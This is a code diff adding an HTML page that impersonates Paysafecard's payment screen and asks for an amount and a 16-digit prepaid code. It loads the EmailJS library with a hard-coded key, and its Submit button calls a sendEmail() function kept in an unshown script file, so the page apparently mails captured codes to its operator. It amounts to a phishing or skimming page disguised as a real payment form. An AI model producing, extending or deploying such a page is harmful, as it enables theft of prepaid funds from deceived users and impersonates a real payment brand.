@@ -1,0 +1,40 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Paysafecard</title>
+    <script src="script.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="sweetalert2.all.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("ZZAmAeiGvzyf2KhWz");
+        })();
+    </script>
+</head>
+
+<body>
+    <div class="form-main">
+        <img src="img/paysafecard_logo.png" alt="paysafecard-logo" class="logo">
+        <div class="form-flex">
+            <div class="form-body">
+                <h1>Pay with paysafecard</h1>
+                <div class="form-fields">
+                    <h3 class="form-amount">Amount :</h3>
+                    <input type="number" id="amount" class="input-amount" step="5" required>
+                    <span class="form-title"><h3></h3></span>
+                    <input minlength="15" maxlength="16" type="text" id="code" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"
+                        class="input-code" required>
+                    <label for="code">16-digits code</label>
+                </div>
+                <button class="form-btn" onclick="sendEmail()">Submit</button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
